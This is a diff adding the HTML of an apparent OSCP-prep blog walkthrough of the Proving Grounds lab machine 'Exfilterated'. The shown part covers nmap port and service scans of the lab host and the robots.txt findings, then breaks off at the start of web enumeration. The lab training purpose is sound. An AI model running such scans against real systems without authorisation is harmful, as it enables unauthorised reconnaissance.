@@ -1,0 +1,587 @@
+<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta name="generator" content="Gatsby 5.13.7"/><meta data-react-helmet="true" name="description" content="Solving Exfilterated machine from Proving Grounds"/><meta data-react-helmet="true" name="viewport" content="width=device-width, initial-scale=1.0"/><meta data-react-helmet="true" http-equiv="Content-Type" content="text/html;charset=UTF-8"/><meta data-react-helmet="true" property="og:type" content="website"/><meta data-react-helmet="true" property="og:title" content="OSCP Prep: Proving Grounds : Exfilterated"/><meta data-react-helmet="true" property="og:description" content="Solving Exfilterated machine from Proving Grounds"/><meta data-react-helmet="true" property="og:image" content="/static/100687a0435dc84798cb4768b9db3e23/1.png"/><meta data-react-helmet="true" property="og:url"/><meta data-react-helmet="true" property="og:site_name" content="OSCP Prep: Proving Grounds : Exfilterated"/><meta data-react-helmet="true" name="twitter:card" content="summary"/><meta data-react-helmet="true" name="twitter:title" content="OSCP Prep: Proving Grounds : Exfilterated"/><meta data-react-helmet="true" name="twitter:description" content="Solving Exfilterated machine from Proving Grounds"/><meta data-react-helmet="true" name="twitter:image" content="/static/100687a0435dc84798cb4768b9db3e23/1.png"/><meta data-react-helmet="true" name="twitter:site" content="@Hosan"/><meta data-react-helmet="true" name="twitter:creator" content="@Hosan"/><meta data-react-helmet="true" name="google-site-verification" content="FCIdHVjw_jBPbB0l6gXODqTFlM47h7YaiUfT1hIZqfI"/><meta data-react-helmet="true" name="naver-site-verification" content="aaa42c74638f5011238f2979942a4c6bb674bee0"/><style data-href="/styles.6f5efa0135677e26f5fe.css" data-identity="gatsby-global-css">code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#fff;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;hyphens:none;line-height:1.5;tab-size:4;text-align:left;text-shadow:0 -.1em .2em #000;white-space:pre;word-break:normal;word-spacing:normal}:not(pre)>code[class*=language-],pre[class*=language-]{background:#141414}pre[class*=language-]{border:.3em solid #545454;border-radius:.5em;box-shadow:inset 1px 1px .5em #000;margin:.5em 0;overflow:auto;padding:1em}pre[class*=language-]::selection{background:#27292a}code[class*=language-] ::selection,code[class*=language-]::selection,pre[class*=language-] ::selection,pre[class*=language-]::selection{background:hsla(0,0%,93%,.15);text-shadow:none}:not(pre)>code[class*=language-]{border:.13em solid #545454;border-radius:.3em;box-shadow:inset 1px 1px .3em -.1em #000;padding:.15em .2em .05em;white-space:normal}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#787878}.token.namespace,.token.punctuation{opacity:.7}.token.boolean,.token.deleted,.token.number,.token.tag{color:#cf694a}.token.builtin,.token.constant,.token.keyword,.token.property,.token.selector,.token.symbol{color:#f9ee9a}.language-css .token.string,.style .token.string,.token.attr-name,.token.attr-value,.token.char,.token.entity,.token.inserted,.token.operator,.token.string,.token.url,.token.variable{color:#919e6b}.token.atrule{color:#7386a5}.token.important,.token.regex{color:#e9c163}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.language-markup .token.attr-name,.language-markup .token.punctuation,.language-markup .token.tag{color:#ad895c}.token{position:relative;z-index:1}.line-highlight.line-highlight{background:rgba(84,84,84,.25);background:linear-gradient(90deg,rgba(84,84,84,.1) 70%,rgba(84,84,84,0));border-bottom:1px dashed #545454;border-top:1px dashed #545454;margin-top:.75em;z-index:0}.line-highlight.line-highlight:before,.line-highlight.line-highlight[data-end]:after{background-color:#8794a6;color:#f5f2f0}</style><title data-react-helmet="true">OSCP Prep: Proving Grounds : Exfilterated</title><link data-react-helmet="true" rel="dns-prefetch" href="https://fonts.gstatic.com"/><link data-react-helmet="true" rel="shortcut icon" href="data:image/png;base64,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"/><link rel="canonical" href="https://hosahn.github.io/240910/" data-baseprotocol="https:" data-basehost="hosahn.github.io"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){const t=e.target;if(void 0===t.dataset.mainImage)return;if(void 0===t.dataset.gatsbyImageSsr)return;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link rel="sitemap" type="application/xml" href="/sitemap-index.xml"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion="css 13ku56z">.css-13ku56z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;height:100%;}</style><main class="css-13ku56z e1strnqo0"><style data-emotion="css-global h7q0e8">@import url('https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&display=swap');*{padding:0;margin:0;box-sizing:border-box;font-family:'Nanum Myeongjo',serif;}html,body,#___gatsby{height:100%;}a,a:hover{color:black;-webkit-text-decoration:none;text-decoration:none;cursor:pointer;}img{border:1px solid black;margin:1rem 0;margin-top:2.0rem;margin-bottom:2.0rem;}body h1,body h2,body h3,body h4,body h5,body h6{font-weight:800;line-height:1.3;margin-bottom:0.5rem;margin-top:0.5rem;color:#222;}h1{font-size:2.5rem;}h2{font-size:2rem;}h3{font-size:1.75rem;}p{margin-bottom:1.0rem;line-height:1.5;}blockquote{border-left:4px solid #ccc;padding-left:1rem;margin:1.5rem 0;color:#666;line-height:1.8;}ul,ol{margin:0;padding-left:1.5rem;line-height:1.8;margin-bottom:0rem;}li{margin-bottom:0.75rem;}</style><style data-emotion="css cm164m">.css-cm164m{position:-webkit-sticky;position:-webkit-sticky;position:sticky;z-index:1;top:0;width:100%;padding-top:20px;padding-bottom:20px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;background-color:#7490b5;}@media (max-width: 768px){.css-cm164m{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;text-align:center;}}</style><div class="css-cm164m e15l4yeg6"><style data-emotion="css 1yrcabi">.css-1yrcabi{display:none;font-size:24px;margin-right:30px;background-color:transparent;border:none;cursor:pointer;}@media (max-width: 768px){.css-1yrcabi{display:block;margin-left:20px;}}</style><button class="css-1yrcabi e15l4yeg1">☰</button><style data-emotion="css 16w8lq8">.css-16w8lq8{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:end;-ms-flex-pack:end;-webkit-justify-content:end;justify-content:end;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}@media (max-width: 768px){.css-16w8lq8{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:100%;display:none;}}</style><div class="css-16w8lq8 e15l4yeg0"><style data-emotion="css 1sav23y">.css-1sav23y{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';background-color:transparent;border:none;cursor:pointer;}</style><button class="css-1sav23y e15l4yeg5"><style data-emotion="css 2331mw">.css-2331mw{z-index:3;}.css-2331mw:hover{background-image:linear-gradient(transparent 60%, white 40%);}</style><a class="css-2331mw e15l4yeg3" href="/">Main</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/search/">Search</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://github.com/hosahn" class="css-2331mw e15l4yeg2">Github</a></button><button class="css-1sav23y e15l4yeg5"><a href="https://bottlenose-apology-5f4.notion.site/6cefa80ae2a642b8b2523495d3d4bcef" class="css-2331mw e15l4yeg2">About</a></button><button class="css-1sav23y e15l4yeg5"><a class="css-2331mw e15l4yeg3" href="/contact/">Contact</a></button></div></div><style data-emotion="css 16cz9yp">.css-16cz9yp{position:relative;width:100%;height:400px;}@media (max-width: 768px){.css-16cz9yp{height:300px;}}</style><div class="css-16cz9yp e1opi4mu1"><style data-emotion="css 1bjn9yo">.css-1bjn9yo{z-index:-1;width:100%;height:400px;object-fit:cover;-webkit-filter:brightness(0.25);filter:brightness(0.25);}@media (max-width: 768px){.css-1bjn9yo{height:300px;}}</style><div data-gatsby-image-wrapper="" style="position:absolute" class="gatsby-image-wrapper gatsby-image-wrapper-constrained css-1bjn9yo e1opi4mu0"><div style="max-width:1340px;display:block"><img alt="" role="presentation" aria-hidden="true" src="data:image/svg+xml;charset=utf-8,%3Csvg%20height=&#x27;880&#x27;%20width=&#x27;1340&#x27;%20xmlns=&#x27;http://www.w3.org/2000/svg&#x27;%20version=&#x27;1.1&#x27;%3E%3C/svg%3E" style="max-width:100%;display:block;position:static"/></div><img aria-hidden="true" data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC1ElEQVR42p2T204bVxSG55GqJjgEe3w22B4848PYYw82PoGMU5s0QMEoIRALQUl70RaUQisg6nvxAFWr9IIGbAP9umanva7ULf36196a9a/jaNVGl/riEu5CC7voUnJqCk6lgV1uUChWyeYr/wkrV1asIef+/p77uzvFDw8P/J/z1z9+2p0I/f7br1xdXfHhwx+MRmMFL8BkMmHisYfRiDvBaDLm+uaGP6+vGd3ecvPxI7dyvxV7PB6jtdrLNBptGs0l6o0lmh7X22z2e/x0MOT9yfdcnF9yef4LF8c/cHlyzOXpKRfC56c/c/bdCe92tnj/7pizH8/QHk895dHjaXy+GaaU/RTv7bPPfWSiUdZqFTa/2uX1y12+frnB4XDIwf4B+/tHvNk7ZNDf4HkqwXazxnD9BZoejBIMxQiF4kQiCfRgjKAHeZvxhwgEIpSKNXoVh0E1x9H2Om93d/hmb49vD9+y/eUWTjzJaqnATmcZzXOMRGaVWCT8r2hU2WEJMhMIMzPtxzUtNp71WK0UGbh5Xjdd9l+sMuj1MNIWlWSahi1TjsaSGEaWfN4RlCgWK4rT8lHWKpDL2kSiczzyBWi3uxwMj/iiVmMlk6Jv53jzrMuy2yBXqlFvddESswYZ06Zgyw6WqgoFETfms0o0Y3hsoutRnkzrbG6+orOySjpl4ph5HMvGkV1d7vRpSUAtljAwMgW1zOVKnYpEcxeakqlLTLIPBWOqDUE9pgTnkhnW1gfkC1KJvYBbbdPpPld+RspCi4tgKp0jK5tuFxdEeBGnvEhZYFlFlZkn6PXTs6d8fnGu0+utUa22VBssqdBImgpaLJ6WqHIx8phmUQnn8l4f5ZfKOipLJRqWYUmWgcCn0jsrfbak/IyRIz2XkexMJSxDSZGYzZBMZZmfL2CJiCdqZUvCjvTKUqvkrVU49Kl0v6ySX6afiKeIycB0PUJUOKBH+RsP+1oC9AIt2QAAAABJRU5ErkJggg==" alt=""/><picture><source type="image/webp" data-srcset="/static/100687a0435dc84798cb4768b9db3e23/b6eb7/1.webp 335w,/static/100687a0435dc84798cb4768b9db3e23/6a112/1.webp 670w,/static/100687a0435dc84798cb4768b9db3e23/fe2a7/1.webp 1340w" sizes="(min-width: 1340px) 1340px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 1340px) 1340px, 100vw" decoding="async" loading="lazy" data-src="/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png" data-srcset="/static/100687a0435dc84798cb4768b9db3e23/e70bd/1.png 335w,/static/100687a0435dc84798cb4768b9db3e23/02ead/1.png 670w,/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png 1340w" alt="thumbnail"/></picture><noscript><picture><source type="image/webp" srcSet="/static/100687a0435dc84798cb4768b9db3e23/b6eb7/1.webp 335w,/static/100687a0435dc84798cb4768b9db3e23/6a112/1.webp 670w,/static/100687a0435dc84798cb4768b9db3e23/fe2a7/1.webp 1340w" sizes="(min-width: 1340px) 1340px, 100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="(min-width: 1340px) 1340px, 100vw" decoding="async" loading="lazy" src="/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png" srcSet="/static/100687a0435dc84798cb4768b9db3e23/e70bd/1.png 335w,/static/100687a0435dc84798cb4768b9db3e23/02ead/1.png 670w,/static/100687a0435dc84798cb4768b9db3e23/480b7/1.png 1340w" alt="thumbnail"/></picture></noscript><script type="module">const t="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;if(t){const t=document.querySelectorAll("img[data-main-image]");for(let e of t){e.dataset.src&&(e.setAttribute("src",e.dataset.src),e.removeAttribute("data-src")),e.dataset.srcset&&(e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset"));const t=e.parentNode.querySelectorAll("source[data-srcset]");for(let e of t)e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset");e.complete&&(e.style.opacity=1,e.parentNode.parentNode.querySelector("[data-placeholder-image]").style.opacity=0)}}</script></div><style data-emotion="css m1156n">.css-m1156n{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;height:100%;margin:0 auto;padding:60px 0;color:#ffffff;}@media (max-width: 768px){.css-m1156n{width:100%;padding:40px 20px;}}</style><div class="css-m1156n e1st1jau3"><style data-emotion="css gywgo7">.css-gywgo7{display:grid;place-items:center;width:40px;height:40px;border-radius:50%;background:#ffffff;color:#000000;font-size:22px;cursor:pointer;box-shadow:0 0 10px rgba(0, 0, 0, 0.3);}@media (max-width: 768px){.css-gywgo7{width:30px;height:30px;font-size:18px;}}</style><div class="css-gywgo7 e1st1jau2"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-left" class="svg-inline--fa fa-arrow-left " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.2 288 416 288c17.7 0 32-14.3 32-32s-14.3-32-32-32l-306.7 0L214.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"></path></svg></div><style data-emotion="css gn4qtp">.css-gn4qtp{display:-webkit-box;overflow:hidden;overflow-wrap:break-word;margin-top:auto;text-overflow:ellipsis;white-space:normal;-webkit-line-clamp:2;-webkit-box-orient:vertical;font-size:45px;font-weight:800;}@media (max-width: 768px){.css-gn4qtp{font-size:30px;}}</style><div class="css-gn4qtp e1st1jau1">OSCP Prep: Proving Grounds : Exfilterated</div><style data-emotion="css 3gcnt2">.css-3gcnt2{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;margin-top:10px;font-size:18px;font-weight:700;}@media (max-width: 768px){.css-3gcnt2{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-align-items:flex-start;-webkit-box-align:flex-start;-ms-flex-align:flex-start;align-items:flex-start;font-size:15px;font-weight:400;}}</style><div class="css-3gcnt2 e1st1jau0"><div>C-SEC / proving_grounds / full-machine / ENG</div><div>2024.09.10.</div></div></div></div><style data-emotion="css uo146q">.css-uo146q{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:768px;margin:0 auto;padding:100px 0;word-break:break-all;line-height:1.8;font-size:16px;font-weight:400;}.css-uo146q p{padding:3px 0;}.css-uo146q h1,.css-uo146q h2,.css-uo146q h3{font-weight:800;margin-bottom:30px;}.css-uo146q *+h1,.css-uo146q *+h2,.css-uo146q *+h3{margin-top:80px;}.css-uo146q hr+h1,.css-uo146q hr+h2,.css-uo146q hr+h3{margin-top:0;}.css-uo146q h1{font-size:30px;}.css-uo146q h2{font-size:25px;}.css-uo146q h3{font-size:20px;}.css-uo146q blockquote{margin:30px 0;padding:5px 15px;border-left:2px solid #000000;font-weight:800;}.css-uo146q ol,.css-uo146q ul{margin-left:20px;padding:30px 0;}.css-uo146q hr{border:1px solid #000000;margin:100px 0;}.css-uo146q a{color:#4263eb;-webkit-text-decoration:underline;text-decoration:underline;}.css-uo146q pre[class*='language-']{margin:30px 0;padding:15px;font-size:15px;}.css-uo146q pre[class*='language-']::-webkit-scrollbar-thumb{background:rgba(255, 255, 255, 0.5);border-radius:3px;}.css-uo146q code[class*='language-'],.css-uo146q pre[class*='language-']{tab-size:2;}@media (max-width: 768px){.css-uo146q{width:100%;padding:80px 20px;line-height:1.6;font-size:14px;}.css-uo146q h1{font-size:23px;}.css-uo146q h2{font-size:20px;}.css-uo146q h3{font-size:17px;}.css-uo146q img{width:100%;}.css-uo146q hr{margin:50px 0;}}</style><div class="css-uo146q e1ijh0y10"><h2>1.Recon</h2>
+<p>Starting with nmap</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/exfiltrated]
+└─$ sudo nmap 192.168.157.163 -p- -T4 
+[sudo] password for hosan: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:11 EDT
+Nmap scan report for 192.168.157.163
+Host is up (0.039s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 19.99 seconds
+</code></pre></div>
+<p>Port 22:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">└─$ sudo nmap 192.168.157.163 -p22 -T4 -A -sC -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT
+Nmap scan report for 192.168.157.163
+Host is up (0.033s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.5 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+<p>Port 80:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/exfiltrated]
+└─$ sudo nmap 192.168.157.163 -p80 -T4 -A -sC -sV
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 14:12 EDT
+Nmap scan report for 192.168.157.163
+Host is up (0.029s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 7 disallowed entries 
+| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
+|_/updates/
+|_http-title: Did not follow redirect to http://exfiltrated.offsec/
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 2.6.32 or 3.10 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%), Linux 3.7 (87%)
+No exact OS matches for host (test conditions non-ideal).</code></pre></div>
+<p>Let’s add exfilterated.offsec to /etc/hosts and continue.</p>
+<h2>2. Enumeration</h2>
+<p>Since ssh has nothing special, we’ll focus on webapp enumeration</p>
+<h4>2.1 Webapp enumeration</h4>
+<p>index page:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/100687a0435dc84798cb4768b9db3e23/d3b48/1.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 65.625%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC1ElEQVR42p2T204bVxSG55GqJjgEe3w22B4848PYYw82PoGMU5s0QMEoIRALQUl70RaUQisg6nvxAFWr9IIGbAP9umanva7ULf36196a9a/jaNVGl/riEu5CC7voUnJqCk6lgV1uUChWyeYr/wkrV1asIef+/p77uzvFDw8P/J/z1z9+2p0I/f7br1xdXfHhwx+MRmMFL8BkMmHisYfRiDvBaDLm+uaGP6+vGd3ecvPxI7dyvxV7PB6jtdrLNBptGs0l6o0lmh7X22z2e/x0MOT9yfdcnF9yef4LF8c/cHlyzOXpKRfC56c/c/bdCe92tnj/7pizH8/QHk895dHjaXy+GaaU/RTv7bPPfWSiUdZqFTa/2uX1y12+frnB4XDIwf4B+/tHvNk7ZNDf4HkqwXazxnD9BZoejBIMxQiF4kQiCfRgjKAHeZvxhwgEIpSKNXoVh0E1x9H2Om93d/hmb49vD9+y/eUWTjzJaqnATmcZzXOMRGaVWCT8r2hU2WEJMhMIMzPtxzUtNp71WK0UGbh5Xjdd9l+sMuj1MNIWlWSahi1TjsaSGEaWfN4RlCgWK4rT8lHWKpDL2kSiczzyBWi3uxwMj/iiVmMlk6Jv53jzrMuy2yBXqlFvddESswYZ06Zgyw6WqgoFETfms0o0Y3hsoutRnkzrbG6+orOySjpl4ph5HMvGkV1d7vRpSUAtljAwMgW1zOVKnYpEcxeakqlLTLIPBWOqDUE9pgTnkhnW1gfkC1KJvYBbbdPpPld+RspCi4tgKp0jK5tuFxdEeBGnvEhZYFlFlZkn6PXTs6d8fnGu0+utUa22VBssqdBImgpaLJ6WqHIx8phmUQnn8l4f5ZfKOipLJRqWYUmWgcCn0jsrfbak/IyRIz2XkexMJSxDSZGYzZBMZZmfL2CJiCdqZUvCjvTKUqvkrVU49Kl0v6ySX6afiKeIycB0PUJUOKBH+RsP+1oC9AIt2QAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <picture>
+          <source
+              srcset="/static/100687a0435dc84798cb4768b9db3e23/a59e9/1.webp 192w,
+/static/100687a0435dc84798cb4768b9db3e23/0ca9f/1.webp 384w,
+/static/100687a0435dc84798cb4768b9db3e23/dc9b9/1.webp 768w,
+/static/100687a0435dc84798cb4768b9db3e23/e2c2f/1.webp 1152w,
+/static/100687a0435dc84798cb4768b9db3e23/f0eed/1.webp 1340w"
+              sizes="(max-width: 768px) 100vw, 768px"
+              type="image/webp"
+            />
+          <source
+            srcset="/static/100687a0435dc84798cb4768b9db3e23/3b721/1.png 192w,
+/static/100687a0435dc84798cb4768b9db3e23/66595/1.png 384w,
+/static/100687a0435dc84798cb4768b9db3e23/fe486/1.png 768w,
+/static/100687a0435dc84798cb4768b9db3e23/d2d74/1.png 1152w,
+/static/100687a0435dc84798cb4768b9db3e23/d3b48/1.png 1340w"
+            sizes="(max-width: 768px) 100vw, 768px"
+            type="image/png"
+          />
+          <img
+            class="gatsby-resp-image-image"
+            src="/static/100687a0435dc84798cb4768b9db3e23/fe486/1.png"
+            alt="image"
+            title=""
+            loading="lazy"
+            decoding="async"
+            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+          />
+        </picture>
+  </a>
+    </span></p>
+<p>footer:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/10e7478273815a2c9ee9f4d6ae60ece3/7644a/2.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
